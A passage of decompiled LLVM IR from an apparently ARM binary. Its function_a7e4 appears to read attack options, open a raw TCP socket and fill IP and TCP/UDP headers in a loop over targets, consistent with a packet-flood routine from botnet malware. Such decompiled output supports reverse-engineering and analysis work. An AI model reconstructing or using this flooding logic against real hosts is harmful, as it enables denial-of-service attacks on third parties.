  store i32 %v5_a6a8, i32* %r2.global-to-local, align 4
  %v0_a6b4 = load i32, i32* @r4, align 4
  %v5_a6b4 = mul nuw nsw i32 %v3_a6ac, 4
  %v6_a6b4 = add i32 %v5_a6b4, %v5_a6a8
  %v7_a6b4 = inttoptr i32 %v6_a6b4 to i32*
  store i32 %v0_a6b4, i32* %v7_a6b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a6bc = load i32, i32* %r3.global-to-local, align 4
  %v1_a6bc = load i32, i32* @r7, align 4
  %v2_a6bc = add i32 %v1_a6bc, %v0_a6bc
  store i32 %v2_a6bc, i32* %r3.global-to-local, align 4
  %v1_a6c4 = trunc i32 %v2_a6bc to i8
  %v2_a6c4 = load i32, i32* @r5, align 4
  %v3_a6c4 = inttoptr i32 %v2_a6c4 to i8*
  store i8 %v1_a6c4, i8* %v3_a6c4, align 1
  %v0_a6c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a6c8 = load i32, i32* @r6, align 4
  %v2_a6c8 = inttoptr i32 %v1_a6c8 to i32*
  store i32 %v0_a6c8, i32* %v2_a6c8, align 4
  %v2_a6cc = call i32 @function_1320c(i32 %v1_a6bc, i32 8)
  %v2_a6d0 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a6d0 = zext i8 %v2_a6d0 to i32
  store i32 ptrtoint (i32* @global_var_ae40.84 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a6cc, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_a6e0 = load i32, i32* @r7, align 4
  %v2_a6e0 = add i32 %v1_a6e0, %v3_a6d0
  store i32 %v2_a6e0, i32* %r1.global-to-local, align 4
  %v2_a6e4 = load i32, i32* @global_var_22328.55, align 4
  %v2_a6e8 = inttoptr i32 %v2_a6cc to i32*
  store i32 ptrtoint (i32* @global_var_ae40.84 to i32), i32* %v2_a6e8, align 4
  %v3_a6ec = load i32, i32* @r4, align 4
  %v4_a6ec = add i32 %v3_a6ec, 4
  %v5_a6ec = inttoptr i32 %v4_a6ec to i8*
  store i8 6, i8* %v5_a6ec, align 1
  %v0_a6f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a6f0 = mul i32 %v0_a6f0, 4
  store i32 %v3_a6f0, i32* %r1.global-to-local, align 4
  %v5_a6f4 = call i32 @function_143c8(i32 %v2_a6e4, i32 %v3_a6f0, i32 ptrtoint (i32* @global_var_ae40.84 to i32), i32 6)
  %v2_a6f8 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a6f8 = zext i8 %v2_a6f8 to i32
  store i32 %v3_a6f8, i32* %r3.global-to-local, align 4
  store i32 %v5_a6f4, i32* %r2.global-to-local, align 4
  %v0_a700 = load i32, i32* @r4, align 4
  %v5_a700 = mul nuw nsw i32 %v3_a6f8, 4
  %v6_a700 = add i32 %v5_a700, %v5_a6f4
  %v7_a700 = inttoptr i32 %v6_a700 to i32*
  store i32 %v0_a700, i32* %v7_a700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a708 = load i32, i32* %r3.global-to-local, align 4
  %v1_a708 = load i32, i32* @r7, align 4
  %v2_a708 = add i32 %v1_a708, %v0_a708
  store i32 %v2_a708, i32* %r3.global-to-local, align 4
  %v1_a710 = trunc i32 %v2_a708 to i8
  %v2_a710 = load i32, i32* @r5, align 4
  %v3_a710 = inttoptr i32 %v2_a710 to i8*
  store i8 %v1_a710, i8* %v3_a710, align 1
  %v0_a714 = load i32, i32* %r2.global-to-local, align 4
  %v1_a714 = load i32, i32* @r6, align 4
  %v2_a714 = inttoptr i32 %v1_a714 to i32*
  store i32 %v0_a714, i32* %v2_a714, align 4
  %v2_a718 = call i32 @function_1320c(i32 %v1_a708, i32 8)
  %v2_a71c = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a71c = zext i8 %v2_a71c to i32
  store i32 ptrtoint (i32* @global_var_a7e4.86 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a718, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_a72c = load i32, i32* @r7, align 4
  %v2_a72c = add i32 %v1_a72c, %v3_a71c
  store i32 %v2_a72c, i32* %r1.global-to-local, align 4
  %v2_a730 = load i32, i32* @global_var_22328.55, align 4
  %v2_a734 = inttoptr i32 %v2_a718 to i32*
  store i32 ptrtoint (i32* @global_var_a7e4.86 to i32), i32* %v2_a734, align 4
  %v3_a738 = load i32, i32* @r4, align 4
  %v4_a738 = add i32 %v3_a738, 4
  %v5_a738 = inttoptr i32 %v4_a738 to i8*
  store i8 7, i8* %v5_a738, align 1
  %v0_a73c = load i32, i32* %r1.global-to-local, align 4
  %v3_a73c = mul i32 %v0_a73c, 4
  store i32 %v3_a73c, i32* %r1.global-to-local, align 4
  %v5_a740 = call i32 @function_143c8(i32 %v2_a730, i32 %v3_a73c, i32 ptrtoint (i32* @global_var_a7e4.86 to i32), i32 7)
  %v2_a744 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a744 = zext i8 %v2_a744 to i32
  store i32 %v3_a744, i32* %r3.global-to-local, align 4
  store i32 %v5_a740, i32* %r2.global-to-local, align 4
  %v0_a74c = load i32, i32* @r4, align 4
  %v5_a74c = mul nuw nsw i32 %v3_a744, 4
  %v6_a74c = add i32 %v5_a74c, %v5_a740
  %v7_a74c = inttoptr i32 %v6_a74c to i32*
  store i32 %v0_a74c, i32* %v7_a74c, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a754 = load i32, i32* %r3.global-to-local, align 4
  %v1_a754 = load i32, i32* @r7, align 4
  %v2_a754 = add i32 %v1_a754, %v0_a754
  store i32 %v2_a754, i32* %r3.global-to-local, align 4
  %v1_a75c = trunc i32 %v2_a754 to i8
  %v2_a75c = load i32, i32* @r5, align 4
  %v3_a75c = inttoptr i32 %v2_a75c to i8*
  store i8 %v1_a75c, i8* %v3_a75c, align 1
  %v0_a760 = load i32, i32* %r2.global-to-local, align 4
  %v1_a760 = load i32, i32* @r6, align 4
  %v2_a760 = inttoptr i32 %v1_a760 to i32*
  store i32 %v0_a760, i32* %v2_a760, align 4
  %v2_a764 = call i32 @function_1320c(i32 %v1_a754, i32 8)
  %v2_a768 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a768 = zext i8 %v2_a768 to i32
  store i32 ptrtoint (i32* @global_var_81cc.88 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a764, i32* @r4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_a778 = load i32, i32* @r7, align 4
  %v2_a778 = add i32 %v1_a778, %v3_a768
  store i32 %v2_a778, i32* %r1.global-to-local, align 4
  %v2_a77c = load i32, i32* @global_var_22328.55, align 4
  %v2_a780 = inttoptr i32 %v2_a764 to i32*
  store i32 ptrtoint (i32* @global_var_81cc.88 to i32), i32* %v2_a780, align 4
  %v3_a784 = load i32, i32* @r4, align 4
  %v4_a784 = add i32 %v3_a784, 4
  %v5_a784 = inttoptr i32 %v4_a784 to i8*
  store i8 10, i8* %v5_a784, align 1
  %v0_a788 = load i32, i32* %r1.global-to-local, align 4
  %v3_a788 = mul i32 %v0_a788, 4
  store i32 %v3_a788, i32* %r1.global-to-local, align 4
  %v5_a78c = call i32 @function_143c8(i32 %v2_a77c, i32 %v3_a788, i32 ptrtoint (i32* @global_var_81cc.88 to i32), i32 10)
  %v2_a790 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a790 = zext i8 %v2_a790 to i32
  store i32 %v3_a790, i32* %r3.global-to-local, align 4
  %v1_a794 = load i32, i32* @r6, align 4
  %v2_a794 = inttoptr i32 %v1_a794 to i32*
  store i32 %v5_a78c, i32* %v2_a794, align 4
  %v0_a798 = load i32, i32* @r4, align 4
  %v2_a798 = load i32, i32* %r3.global-to-local, align 4
  %v5_a798 = mul i32 %v2_a798, 4
  %v6_a798 = add i32 %v5_a798, %v5_a78c
  %v7_a798 = inttoptr i32 %v6_a798 to i32*
  store i32 %v0_a798, i32* %v7_a798, align 4
  %v0_a79c = load i32, i32* %r3.global-to-local, align 4
  %v1_a79c = load i32, i32* @r7, align 4
  %v2_a79c = add i32 %v1_a79c, %v0_a79c
  store i32 %v2_a79c, i32* %r2.global-to-local, align 4
  %v1_a7a4 = trunc i32 %v2_a79c to i8
  %v2_a7a4 = load i32, i32* @r5, align 4
  %v3_a7a4 = inttoptr i32 %v2_a7a4 to i8*
  store i8 %v1_a7a4, i8* %v3_a7a4, align 1
  ret i32 %v1_a79c

; uselistorder directives
  uselistorder i32 %v1_a79c, { 1, 0 }
  uselistorder i32 %v3_a788, { 1, 0 }
  uselistorder i32 %v1_a754, { 1, 0 }
  uselistorder i32 %v3_a73c, { 1, 0 }
  uselistorder i32 %v1_a708, { 1, 0 }
  uselistorder i32 %v3_a6f0, { 1, 0 }
  uselistorder i32 %v1_a6bc, { 1, 0 }
  uselistorder i32 %v3_a6a4, { 1, 0 }
  uselistorder i32 %v1_a670, { 1, 0 }
  uselistorder i32 %v3_a658, { 1, 0 }
  uselistorder i32 %v1_a624, { 1, 0 }
  uselistorder i32 %v3_a60c, { 1, 0 }
  uselistorder i32 %v1_a5d8, { 1, 0 }
  uselistorder i32 %v3_a5c0, { 1, 0 }
  uselistorder i32 %v1_a58c, { 1, 0 }
  uselistorder i32 %v3_a574, { 1, 0 }
  uselistorder i32 %v1_a540, { 1, 0 }
  uselistorder i32 %v3_a528, { 1, 0 }
  uselistorder i32 %v2_a504, { 1, 0 }
  uselistorder i32 %v5_a4e0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a4dc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i8 7, { 2, 3, 4, 0, 1 }
  uselistorder i8 4, { 2, 1, 0 }
  uselistorder i8 3, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_22324.53 to i8*), { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_22325.70 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_22328.55, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
}

define i32 @function_a7e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a7e4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a7e4 = load i32, i32* @r4, align 4
  %v24_a7e4 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_a800 = call i32 @function_1320c(i32 %arg1, i32 4)
  %v0_a804 = load i32, i32* @r5, align 4
  store i32 %v0_a804, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a814 = load i32, i32* @r4, align 4
  store i32 %v0_a814, i32* %r0.global-to-local, align 4
  %v5_a818 = inttoptr i32 %v0_a804 to i32*
  %v6_a818 = call i32 @function_a430(i32 %v0_a814, i32* %v5_a818, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a830 = load i32, i32* @r5, align 4
  store i32 %v0_a830, i32* %r1.global-to-local, align 4
  %v0_a834 = load i32, i32* @r4, align 4
  store i32 %v0_a834, i32* %r0.global-to-local, align 4
  %v5_a838 = trunc i32 %v6_a818 to i8
  %v6_a83c = inttoptr i32 %v0_a830 to i32*
  %v7_a83c = call i32 @function_a430(i32 %v0_a834, i32* %v6_a83c, i32 3, i32 65535)
  %v0_a840 = load i32, i32* @r5, align 4
  store i32 %v0_a840, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a83c, i32* %fp.global-to-local, align 4
  %v0_a850 = load i32, i32* @r4, align 4
  store i32 %v0_a850, i32* %r0.global-to-local, align 4
  %v4_a854 = inttoptr i32 %v0_a840 to i32*
  %v5_a854 = call i32 @function_a430(i32 %v0_a850, i32* %v4_a854, i32 4, i32 64)
  %v0_a860 = load i32, i32* @r5, align 4
  store i32 %v0_a860, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a86c = load i32, i32* @r4, align 4
  store i32 %v0_a86c, i32* %r0.global-to-local, align 4
  %v6_a874 = inttoptr i32 %v0_a860 to i32*
  %v7_a874 = call i32 @function_a430(i32 %v0_a86c, i32* %v6_a874, i32 5, i32 1)
  %v1_a880 = urem i32 %v7_a874, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a88c = load i32, i32* @r5, align 4
  store i32 %v0_a88c, i32* %r1.global-to-local, align 4
  %v0_a890 = load i32, i32* @r4, align 4
  store i32 %v0_a890, i32* %r0.global-to-local, align 4
  %v5_a898 = inttoptr i32 %v0_a88c to i32*
  %v6_a898 = call i32 @function_a430(i32 %v0_a890, i32* %v5_a898, i32 6, i32 65535)
  %v0_a8a0 = load i32, i32* @r5, align 4
  store i32 %v0_a8a0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a898, i32* @r8, align 4
  %v0_a8b0 = load i32, i32* @r4, align 4
  store i32 %v0_a8b0, i32* %r0.global-to-local, align 4
  %v4_a8b4 = inttoptr i32 %v0_a8a0 to i32*
  %v5_a8b4 = call i32 @function_a430(i32 %v0_a8b0, i32* %v4_a8b4, i32 7, i32 65535)
  %v0_a8b8 = load i32, i32* @r5, align 4
  store i32 %v0_a8b8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_a8b4, i32* @r7, align 4
  %v0_a8c8 = load i32, i32* @r4, align 4
  store i32 %v0_a8c8, i32* %r0.global-to-local, align 4
  %v4_a8cc = inttoptr i32 %v0_a8b8 to i32*
  %v5_a8cc = call i32 @function_a430(i32 %v0_a8c8, i32* %v4_a8cc, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a8dc = load i32, i32* @r5, align 4
  store i32 %v0_a8dc, i32* %r1.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r4, align 4
  store i32 %v0_a8e0, i32* %r0.global-to-local, align 4
  %v4_a8e4 = inttoptr i32 %v0_a8dc to i32*
  %v5_a8e4 = call i32 @function_a430(i32 %v0_a8e0, i32* %v4_a8e4, i32 1, i32 1)
  %v1_a8ec = urem i32 %v5_a8e4, 256
  %v0_a8f0 = load i32, i32* @r5, align 4
  store i32 %v0_a8f0, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8fc = load i32, i32* @r4, align 4
  store i32 %v0_a8fc, i32* %r0.global-to-local, align 4
  %v5_a904 = inttoptr i32 %v0_a8f0 to i32*
  %v6_a904 = call i32 @function_a430(i32 %v0_a8fc, i32* %v5_a904, i32 19, i32 0)
  %v0_a90c = load i32, i32* @r5, align 4
  store i32 %v0_a90c, i32* %r1.global-to-local, align 4
  %v2_a910 = load i32, i32* @global_var_2290c.90, align 4
  store i32 %v2_a910, i32* %r3.global-to-local, align 4
  store i32 %v6_a904, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_a91c = load i32, i32* @r4, align 4
  store i32 %v0_a91c, i32* %r0.global-to-local, align 4
  %v4_a920 = inttoptr i32 %v0_a90c to i32*
  %v5_a920 = call i32 @function_a430(i32 %v0_a91c, i32* %v4_a920, i32 25, i32 %v2_a910)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a934 = call i32 @function_14b54(i32 2, i32 3, i32 6)
  store i32 %v3_a934, i32* @r0, align 4
  %v7_a938 = icmp eq i32 %v3_a934, -1
  store i1 %v7_a938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a938, label %dec_label_pc_ab98, label %dec_label_pc_a944

dec_label_pc_a944:                                ; preds = %dec_label_pc_a7e4
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a94c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a94c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_a960 = call i32 @function_14ae4(i32 %v3_a934, i32 0, i32 3, i32 %v6_a94c, i32 4)
  store i32 %v5_a960, i32* %r0.global-to-local, align 4
  %v7_a964 = icmp eq i32 %v5_a960, -1
  store i1 %v7_a964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a964, label %dec_label_pc_ab90, label %dec_label_pc_a96c

dec_label_pc_a96c:                                ; preds = %dec_label_pc_a944
  %v0_a96c = load i32, i32* @r8, align 4
  %v0_a970 = load i32, i32* @r7, align 4
  %v0_a974 = load i32, i32* %fp.global-to-local, align 4
  %v3_a974 = mul i32 %v0_a974, 65536
  store i32 %v3_a974, i32* %r3.global-to-local, align 4
  %v3_a97c = urem i32 %v0_a96c, 65536
  store i32 %v3_a97c, i32* %r2.global-to-local, align 4
  %v3_a980 = urem i32 %v0_a970, 65536
  store i32 %v3_a980, i32* %r1.global-to-local, align 4
  %v0_a984 = load i32, i32* @r6, align 4
  %v1_a984 = urem i32 %v0_a984, 256
  store i32 %v1_a984, i32* @r6, align 4
  %v0_a988 = load i32, i32* @sl, align 4
  %v2_a988 = icmp eq i32 %v0_a988, 0
  store i1 %v2_a988, i1* %cpsr_z.global-to-local, align 1
  %v3_a98c = urem i32 %v0_a974, 65536
  store i32 %v3_a98c, i32* @fp, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a988, label %dec_label_pc_ae20, label %dec_label_pc_a9a4

dec_label_pc_a9a4:                                ; preds = %dec_label_pc_a96c
  %v3_a9ac = mul i32 %v5_a8cc, 65536
  %v1_a9b0 = add i32 %v3_a9ac, 524288
  %v1_a9b4 = add i32 %v3_a9ac, 4325376
  %v1_a9bc = add i32 %v3_a9ac, 1835008
  %v3_a9c0 = udiv i32 %v1_a9b4, 65536
  store i32 %v3_a9c0, i32* %r1.global-to-local, align 4
  %v3_a9c4 = udiv i32 %v1_a9bc, 65536
  store i32 %v3_a9c4, i32* %r3.global-to-local, align 4
  %v3_a9c8 = xor i32 %v3_a98c, 65535
  store i32 %v3_a9c8, i32* %r2.global-to-local, align 4
  %v3_a9cc = udiv i32 %v1_a9b0, 65536
  store i32 %v3_a9cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_ab2c = sext i8 %v5_a838 to i32
  %v2_ab50 = icmp eq i32 %v1_a880, 0
  %v2_aa9c = icmp eq i32 %v1_a984, 0
  %sext = mul i32 %v5_a854, 16777216
  %v4_ab4c = sdiv i32 %sext, 16777216
  br label %dec_label_pc_aaec

dec_label_pc_a9e8:                                ; preds = %dec_label_pc_aaec, %dec_label_pc_ab70
  %v2_a9ec = phi i32 [ %v0_ab5c, %dec_label_pc_aaec ], [ %v2_a9ec.pre, %dec_label_pc_ab70 ]
  %v3_a9ec = add i32 %v2_a9ec, 9
  %v4_a9ec = inttoptr i32 %v3_a9ec to i8*
  store i8 47, i8* %v4_a9ec, align 1
  %v3_a9f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a9f0, i32* %r2.global-to-local, align 4
  store i32 %v5_a920, i32* %r1.global-to-local, align 4
  %v3_a9f8 = mul i32 %v3_a9f0, 32
  store i32 %v3_a9f8, i32* %r3.global-to-local, align 4
  %v1_a9fc = load i32, i32* %r4.global-to-local, align 4
  %v2_a9fc = add i32 %v1_a9fc, 12
  %v3_a9fc = inttoptr i32 %v2_a9fc to i32*
  store i32 %v5_a920, i32* %v3_a9fc, align 4
  %v0_aa00 = load i32, i32* %r3.global-to-local, align 4
  %v1_aa00 = load i32, i32* %r2.global-to-local, align 4
  %tmp = mul i32 %v1_aa00, -8
  %v5_aa00 = add i32 %v0_aa00, %tmp
  %v1_aa04 = load i32, i32* @sb, align 4
  %v2_aa04 = add i32 %v1_aa04, %v5_aa00
  store i32 %v2_aa04, i32* %r3.global-to-local, align 4
  %v1_aa08 = add i32 %v2_aa04, 16
  %v2_aa08 = inttoptr i32 %v1_aa08 to i32*
  %v3_aa08 = load i32, i32* %v2_aa08, align 4
  store i32 %v3_aa08, i32* %r2.global-to-local, align 4
  store i32 25856, i32* %r0.global-to-local, align 4
  %v1_aa10 = load i32, i32* %r4.global-to-local, align 4
  %v2_aa10 = add i32 %v1_aa10, 16
  %v3_aa10 = inttoptr i32 %v2_aa10 to i32*
  store i32 %v3_aa08, i32* %v3_aa10, align 4
  %v0_aa14 = load i32, i32* %r0.global-to-local, align 4
  %v1_aa14 = add i32 %v0_aa14, 88
  store i32 %v1_aa14, i32* %r0.global-to-local, align 4
  %v1_aa18 = call i32 @function_1484c(i32 %v1_aa14)
  %v2_aa18 = trunc i32 %v1_aa18 to i16
  %v3_aa1c = load i32, i32* @r8, align 4
  %v4_aa1c = add i32 %v3_aa1c, 2
  %v5_aa1c = inttoptr i32 %v4_aa1c to i16*
  store i16 %v2_aa18, i16* %v5_aa1c, align 2
  store i32 2048, i32* %r0.global-to-local, align 4
  %v1_aa24 = call i32 @function_1484c(i32 2048)
  %v2_aa24 = trunc i32 %v1_aa24 to i8
  store i32 %v1_aa24, i32* %r0.global-to-local, align 4
  %v4_aa28 = udiv i32 %v1_aa24, 256
  store i32 %v4_aa28, i32* %r3.global-to-local, align 4
  %v1_aa2c = trunc i32 %v4_aa28 to i8
  %v2_aa2c = load i32, i32* @r7, align 4
  %v3_aa2c = add i32 %v2_aa2c, 13
  %v4_aa2c = inttoptr i32 %v3_aa2c to i8*
  store i8 %v1_aa2c, i8* %v4_aa2c, align 1
  %v3_aa30 = load i32, i32* @r7, align 4
  %v4_aa30 = add i32 %v3_aa30, 12
  %v5_aa30 = inttoptr i32 %v4_aa30 to i8*
  store i8 %v2_aa24, i8* %v5_aa30, align 1
  %v0_aa34 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa34 = add i32 %v0_aa34, 38
  %v2_aa34 = inttoptr i32 %v1_aa34 to i8*
  %v3_aa34 = load i8, i8* %v2_aa34, align 1
  %tmp59 = urem i8 %v3_aa34, 16
  %v1_aa38 = zext i8 %tmp59 to i32
  %v1_aa3c = or i32 %v1_aa38, 64
  store i32 %v1_aa3c, i32* %r3.global-to-local, align 4
  %v1_aa40 = trunc i32 %v1_aa3c to i8
  store i8 %v1_aa40, i8* %v2_aa34, align 1
  %v0_aa44 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa44 = add i32 %v0_aa44, 38
  %v2_aa44 = inttoptr i32 %v1_aa44 to i8*
  %v3_aa44 = load i8, i8* %v2_aa44, align 1
  %v1_aa48 = and i8 %v3_aa44, -16
  %v1_aa4c = or i8 %v1_aa48, 5
  store i8 %v1_aa4c, i8* %v2_aa44, align 1
  store i32 %v4_ab2c, i32* %r2.global-to-local, align 4
  %v2_aa58 = load i32, i32* @r5, align 4
  %v3_aa58 = add i32 %v2_aa58, 1
  %v4_aa58 = inttoptr i32 %v3_aa58 to i8*
  store i8 %v5_a838, i8* %v4_aa58, align 1
  store i32 %v3_a9c4, i32* %r0.global-to-local, align 4
  %v1_aa60 = call i32 @function_1484c(i32 %v3_a9c4)
  %v2_aa60 = trunc i32 %v1_aa60 to i16
  %v3_aa64 = load i32, i32* @r5, align 4
  %v4_aa64 = add i32 %v3_aa64, 2
  %v5_aa64 = inttoptr i32 %v4_aa64 to i16*
  store i16 %v2_aa60, i16* %v5_aa64, align 2
  store i32 %v3_a9c8, i32* %r0.global-to-local, align 4
  %v1_aa6c = call i32 @function_1484c(i32 %v3_a9c8)
  %v2_aa6c = trunc i32 %v1_aa6c to i16
  store i32 %v1_aa6c, i32* %r0.global-to-local, align 4
  store i32 %v4_ab4c, i32* %r1.global-to-local, align 4
  store i32 %v1_a880, i32* %r3.global-to-local, align 4
  store i1 %v2_ab50, i1* %cpsr_z.global-to-local, align 1
  %v3_aa7c = load i32, i32* @r5, align 4
  %v4_aa7c = add i32 %v3_aa7c, 4
  %v5_aa7c = inttoptr i32 %v4_aa7c to i16*
  store i16 %v2_aa6c, i16* %v5_aa7c, align 2
  %v0_aa80 = load i32, i32* %r1.global-to-local, align 4
  %v1_aa80 = trunc i32 %v0_aa80 to i8
  %v2_aa80 = load i32, i32* @r5, align 4
  %v3_aa80 = add i32 %v2_aa80, 8
  %v4_aa80 = inttoptr i32 %v3_aa80 to i8*
  store i8 %v1_aa80, i8* %v4_aa80, align 1
  %v0_aa84 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aa84, label %dec_label_pc_aa88, label %dec_label_pc_ab80

dec_label_pc_aa88:                                ; preds = %dec_label_pc_a9e8, %dec_label_pc_ab80
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_aa8c = load i32, i32* @r5, align 4
  %v3_aa8c = add i32 %v2_aa8c, 9
  %v4_aa8c = inttoptr i32 %v3_aa8c to i8*
  store i8 17, i8* %v4_aa8c, align 1
  %v0_aa90 = call i32 @function_f570()
  store i32 %v0_aa90, i32* %r0.global-to-local, align 4
  store i32 %v1_a984, i32* %r2.global-to-local, align 4
  store i1 %v2_aa9c, i1* %cpsr_z.global-to-local, align 1
  %v1_aaa0 = sub i32 1023, %v0_aa90
  store i32 %v1_aaa0, i32* %r3.global-to-local, align 4
  br i1 %v2_aa9c, label %.thread, label %.thread3

.thread:                                          ; preds = %dec_label_pc_aa88
  %v2_aaa8 = load i32, i32* @r5, align 4
  %v3_aaa8 = add i32 %v2_aaa8, 16
  %v4_aaa8 = inttoptr i32 %v3_aaa8 to i32*
  store i32 %v1_aaa0, i32* %v4_aaa8, align 4
  br label %bb

.thread3:                                         ; preds = %dec_label_pc_aa88
  %v1_aaa4 = load i32, i32* %r4.global-to-local, align 4
  %v2_aaa4 = add i32 %v1_aaa4, 16
  %v3_aaa4 = inttoptr i32 %v2_aaa4 to i32*
  %v4_aaa4 = load i32, i32* %v3_aaa4, align 4
  store i32 %v4_aaa4, i32* %r3.global-to-local, align 4
  %v2_aaac = load i32, i32* @r5, align 4
  %v3_aaac = add i32 %v2_aaac, 16
  %v4_aaac = inttoptr i32 %v3_aaac to i32*
  store i32 %v4_aaa4, i32* %v4_aaac, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread3
  %v1_aab0 = load i32, i32* @r5, align 4
  %v2_aab0 = add i32 %v1_aab0, 12
  %v3_aab0 = inttoptr i32 %v2_aab0 to i32*
  store i32 %v0_aa90, i32* %v3_aab0, align 4
  store i32 %v3_a97c, i32* %r0.global-to-local, align 4
  %v1_aab8 = call i32 @function_1484c(i32 %v3_a97c)
  %v2_aab8 = trunc i32 %v1_aab8 to i16
  %v3_aabc = load i32, i32* @r6, align 4
  %v4_aabc = inttoptr i32 %v3_aabc to i16*
  store i16 %v2_aab8, i16* %v4_aabc, align 2
  store i32 %v3_a980, i32* %r0.global-to-local, align 4
  %v1_aac4 = call i32 @function_1484c(i32 %v3_a980)
  %v2_aac4 = trunc i32 %v1_aac4 to i16
  %v3_aac8 = load i32, i32* @r6, align 4
  %v4_aac8 = add i32 %v3_aac8, 2
  %v5_aac8 = inttoptr i32 %v4_aac8 to i16*
  store i16 %v2_aac4, i16* %v5_aac8, align 2
  store i32 %v3_a9cc, i32* %r0.global-to-local, align 4
  %v1_aad0 = call i32 @function_1484c(i32 %v3_a9cc)
  %v2_aad0 = trunc i32 %v1_aad0 to i16
  store i32 %v1_aad0, i32* %r0.global-to-local, align 4
  %v3_aad4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aad4, i32* %r3.global-to-local, align 4
  %v1_aad8 = add i32 %v3_aad4, 1
  store i32 %v1_aad8, i32* @r4, align 4
  %v1_aadc = load i32, i32* @sl, align 4
  %v9_aadc = icmp eq i32 %v1_aad8, %v1_aadc
  store i1 %v9_aadc, i1* %cpsr_z.global-to-local, align 1
  %v3_aae0 = load i32, i32* @r6, align 4
  %v4_aae0 = add i32 %v3_aae0, 4
  %v5_aae0 = inttoptr i32 %v4_aae0 to i16*
  store i16 %v2_aad0, i16* %v5_aae0, align 2
  %v0_aae4 = load i32, i32* @r4, align 4
  store i32 %v0_aae4, i32* %stack_var_-44, align 4
